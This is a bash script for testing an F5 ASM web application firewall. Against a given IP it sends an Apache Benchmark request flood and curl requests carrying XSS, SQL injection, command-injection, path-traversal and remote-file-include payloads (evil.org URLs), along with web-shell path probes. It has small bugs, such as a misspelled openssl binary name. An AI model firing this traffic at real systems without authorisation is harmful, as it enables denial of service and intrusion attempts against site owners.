#!/bin/bash
#
DISCLAIMER="
# \r 
# This script will generate illegal requests that will be logged and/or blocked \n
# by F5 ASM. The ASM configuration is described in the Engineering CPE Technical \n
# Guide F5 v1.2 document.  \n 
# \n 
# The following illegal requests are catered to:     \n 
#  - L7 DDoS                                         \n
#  - Illegal URL/File Type/Meta-Chars                \n
#  - Invalid HTTP response codes                     \n
#  - Forceful browsing (Google hacking)              \n 
#  - Cookie/Session Poisoning                        \n
#  - Parameter/Form Tampering                        \n
#  - Cross Site Scripting                            \n
#  - SQL injection                                   \n
#  - OWASP top 10 attacks                            \n
# \n
# The following illegal requests are not catered to: \n
#  - Specific and/or known malicious Geolocations    \n
#  - Zero day attacks                                \n 
#  - Error message interception                      \n
# \n
# Requires: Apache Benchmark, Curl, OpenSSL \n
# 
"
echo -e $DISCLAIMER

function valid_ip()
{
    local  ip=$1
    local  stat=1

    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        OIFS=$IFS
        IFS='.'
        ip=($ip)
        IFS=$OIFS
        [[ ${ip[0]} -le 255 && ${ip[1]} -le 255 \
            && ${ip[2]} -le 255 && ${ip[3]} -le 255 ]]
        stat=$?
    fi
    return $stat
}

CURL=$(which curl)
AB=$(which ab)
OPENSSL=$(which opensssl)
if [ ! -x $CURL ]; then echo " ! curl binary not found - exiting" ; exit ; fi 
if [ ! -x $AB ]; then echo " ! Apache Benchmark (ab) binary not found - exiting" ; exit ; fi
if [ ! -x $OPENSSL ]; then echo " ! OpenSSL binary not found - exiting" ; exit ; fi

CURLOPT="-k -q --silent --output /dev/null --user-agent Mozilla/5.0"
#CURLOPT="-k --user-agent Mozilla/5.0"
ABOPT="-q -v 0 -n 1000 -c 50"
#ABOPT="-n 1000 -c 50"

TARGET=$1
if ( ! valid_ip $TARGET ) ; then echo " ! target IP not specified - exiting" ; exit ; fi

# L7 DoS
# Note: create a new application DoS profile with thresholds at 10% of standard 
#
echo -e " - Starting L7 DoS attack traffic \r\n"
$AB $ABOPT -H 'User-Agent: Mozilla/5.0' "https://$TARGET/" ##2&>1 /dev/null 

# Illegal URL
#
#echo -e " - Starting Illegal URL traffic \r\n"
# $CURL $CURLOPT 

# Illegal file type
#
#echo -e " - Starting Illegal file type traffic \r\n"
# $CURL $CURLOPT 

# Illegal meta-characters
#
#echo -e " - Starting Illegal meta-character traffic \r\n"
# $CURL $CURLOPT 

# Illegal HTTP response code
# Note: this test requires that the web server returns a 403/similar for the URL
#
echo -e " - Starting Illegal HTTP response traffic \r\n"
$CURL $CURLOPT "https://$TARGET/files/"

# Forceful browsing
#
echo -e " - Starting Forceful browsing traffic \r\n"
$CURL $CURLOPT "https://$TARGET/sample/" 

# Cookie/session poisoning
#
echo -e " - Starting Cookie/session poisoning traffic \r\n"
$CURL $CURLOPT --cookie-jar ./cookies$$.txt "https://$TARGET"
grep "$TARGET" ./cookies$$.txt |awk '{print $1"\t"$2"\t"$3"\t"$4"\t"$5"\t"$6"\tomgoggles"}' > ./new_cookies$$.txt 
$CURL $CURLOPT --cookie ./new_cookies$$.txt "https://$TARGET"
rm -f ./cookies$$.txt
rm -f ./new_cookies$$.txt

# Parameter/form tampering
#
#echo -e " - Starting Parameter/form tampering traffic \r\n"
# $CURL $CURLOPT 

#  Cross site scripting
#
echo -e " - Starting Cross site scripting traffic \r\n"
$CURL $CURLOPT "https://$TARGET/?q=<script>alert('hi')" 
$CURL $CURLOPT --header "Newheader: Yes <script>alert('hi')</script>" "https://$TARGET/"

# SQL injection
#
echo -e " - Starting SQL injection traffic \r\n"
$CURL $CURLOPT "https://$TARGET/?q=‘%20or%201=1#" 
$CURL $CURLOPT --header "Newheader: Yes ‘ or 1=1#" "https://$TARGET/"

# Additional RFC violations
#
echo -e " - Starting Additional RFC violation traffic \r\n"
$CURL $CURLOPT --cookie Bad\"Cookie=quotation_marks "https://$TARGET"
$CURL $CURLOPT --cookie Bad\=Cookie=equals_sign "https://$TARGET"
(echo -e "GET /../ HTTP/1.1\r\nUser-Agent: Mozilla/5.0\r\nHost: $TARGET\r\nAccept: */*\r\nConnection: close\r\n\r\n" ; sleep 1 ) | $OPENSSL s_client -host $TARGET -port 443 2&>1 /dev/null 
(echo -e "GET /\0 HTTP/1.1\r\nUser-Agent: Mozilla/5.0\r\nHost: $TARGET\r\nAccept: */*\r\nConnection: close\r\n\r\n" ; sleep 1 ) | $OPENSSL s_client -host $TARGET -port 443 2&>1 /dev/null 
(echo -e "GET / HTTP/3.0\r\nUser-Agent: Mozilla/5.0\r\nHost: $TARGET\r\nAccept: */*\r\nConnection: close\r\n\r\n" ; sleep 1 ) | $OPENSSL s_client -host $TARGET -port 443 2&>1 /dev/null 
$CURL $CURLOPT --header "Header1: Header1" --header "Header2: Header2" --header "Header3: Header3" --header "Header4: Header4" --header "Header5: Header5" --header "Header6: Header6" --header "Header7: Header7" --header "Header8: Header8" --header "Header9: Header9" --header "Header10: Header10" --header "Header11: Header11" --header "Header12: Header12" --header "Header13: Header13" --header "Header14: Header14" "https://$TARGET"
$CURL $CURLOPT "https://$TARGET/\t"
$CURL $CURLOPT "https://$TARGET/Д"

# Additional Access violations
#
echo -e " - Starting Additional Access violation traffic \r\n"
$CURL $CURLOPT --request PROPFIND "https://$TARGET"

# Additional Length violations
#
echo -e " - Starting Additional Length violation traffic \r\n"
LARGEREQ=$(printf "%0.sX" {1..9000}) 
(echo -e "GET /${LARGEREQ}n HTTP/1.1\r\nUser-Agent: Mozilla/5.0\r\nHost: $TARGET\r\nAccept: */*\r\nConnection: close\r\n\r\n" ; sleep 1 )  | $OPENSSL s_client -host $TARGET -port 443 2&>1 /dev/null 
$CURL $CURLOPT --cookie BadCookie=${LARGEREQ} "https://$TARGET" 

# Additional Input violations
#
echo -e " - Starting Additional Input violation traffic \r\n"
$CURL $CURLOPT "https://$TARGET/q=a\ta"
$CURL $CURLOPT "https://$TARGET/?q=AAAAA\tAAAAA"

# Additional Negative security violations
#
echo -e " - Starting Additional Negative security traffic \r\n"
$CURL $CURLOPT --header "Run: cmd.exe" "https://$TARGET/"
$CURL $CURLOPT "https://$TARGET/?run=cmd.exe"
$CURL $CURLOPT --header "Run: /bin/bash" "https://$TARGET/"
$CURL $CURLOPT "https://$TARGET/?run=/bin/bash"
$CURL $CURLOPT --header "Run: exec fakescript" "https://$TARGET/"
$CURL $CURLOPT "https://$TARGET/?run=exec fakescript"
$CURL $CURLOPT --header "Run: echo test" "https://$TARGET/"
$CURL $CURLOPT "https://$TARGET/?run=echo test"
$CURL $CURLOPT --header "Run: ipconfig /all" "https://$TARGET/"
$CURL $CURLOPT "https://$TARGET/?run=ipconfig /all"
$CURL $CURLOPT "https://$TARGET/?run=objectcategory%3Dtest"
$CURL $CURLOPT "https://$TARGET/?run=homedirectory%3Dtest"
$CURL $CURLOPT --header "Run: fn:id" "https://$TARGET/"
$CURL $CURLOPT "https://$TARGET/?run=fn:id"
$CURL $CURLOPT --header "Run: name(test)" "https://$TARGET/"
$CURL $CURLOPT "https://$TARGET/?run=name(test)"
$CURL $CURLOPT "https://$TARGET/?q=%c0%ae%c0%ae" #
$CURL $CURLOPT "https://$TARGET/?q=Li4vLi4v"
$CURL $CURLOPT "https://$TARGET/?q=valuecontent:../test"
$CURL $CURLOPT "https://$TARGET/?q=..\\test"
$CURL $CURLOPT "https://$TARGET/viewsource.jsp"
$CURL $CURLOPT "https://$TARGET/info/info.jsp"
$CURL $CURLOPT "https://$TARGET/ojspdemos/"
$CURL $CURLOPT "https://$TARGET/publisher"
$CURL $CURLOPT "https://$TARGET/PageServices"
$CURL $CURLOPT "https://$TARGET/?wp-"
$CURL $CURLOPT "https://$TARGET/?run=2.2250738585072012e-308"
$CURL $CURLOPT "https://$TARGET/?q=\#\!\/bin\/sh"
$CURL $CURLOPT "https://$TARGET/?q=_memberAccess=test"
$CURL $CURLOPT "https://$TARGET/?path=https://www.evil.org/include.php"
$CURL $CURLOPT "https://$TARGET/?dir=https://www.evil.org/include.php"
$CURL $CURLOPT "https://$TARGET/?include=https://www.evil.org/include.php"
$CURL $CURLOPT "https://$TARGET/?include=ftp://ftp.evil.org/pub/include.php"
$CURL $CURLOPT --user-agent "Morzilla" "https://$TARGET"
$CURL $CURLOPT --user-agent "Nessus" "https://$TARGET"
$CURL $CURLOPT --user-agent "CenzicHailstorm" "https://$TARGET" 
$CURL $CURLOPT --user-agent "Webtrends Security Analyzer" "https://$TARGET" 
$CURL $CURLOPT "https://$TARGET/shell.txt"
$CURL $CURLOPT "https://$TARGET/c99shell"
$CURL $CURLOPT "https://$TARGET/.dump"
$CURL $CURLOPT "https://$TARGET/lala.ph"
# fixation
# ,'valuecontent:\".\"; nocase; norm; 
#   valuecontent:\"cookie\"; nocase; norm; distance:0; within:11; 
#   valuecontent:\"expires\"; nocase; norm; distance:0; 
#   re2:\"/expires\\W*=/Vsi\"; norm;',
#$CURL $CURLOPT --header "Run: TBD" "https://$TARGET/"
#$CURL $CURLOPT "https://$TARGET/?run=TBD"
#$CURL $CURLOPT --header "Run: TBD" "https://$TARGET/"
#$CURL $CURLOPT "https://$TARGET/?run=TBD"
